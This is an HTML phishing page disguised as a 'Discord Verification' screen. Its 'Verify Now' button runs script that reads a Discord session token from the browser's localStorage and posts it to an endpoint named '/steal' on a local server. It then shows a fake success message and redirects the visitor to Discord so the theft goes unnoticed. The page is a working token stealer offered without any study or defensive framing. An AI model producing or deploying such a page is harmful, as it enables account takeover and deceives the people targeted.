<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Discord Verification</title>
    <style>
        body { background-color: #2f3136; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { text-align: center; }
        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background-color: #5865F2; border: none; color: white; border-radius: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Click below to verify your account</h2>
        <button id="grabBtn">Verify Now</button>
        <p id="status"></p>
    </div>
    <script>
        document.getElementById('grabBtn').addEventListener('click', async () => {
            let token = localStorage.getItem('token');
            if (!token) {
                token = localStorage.getItem('discord_token') || localStorage.getItem('DISCORD_TOKEN');
            }
            if (token) {
                await fetch('http://localhost:3000/steal', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ token })
                });
                document.getElementById('status').innerText = "Verification Successful!";
                setTimeout(() => window.location.href = 'https://discord.com/channels/@me', 1000);
            } else {
                document.getElementById('status').innerText = "Token not found.";
            }
        });
    </script>
</body>
</html>
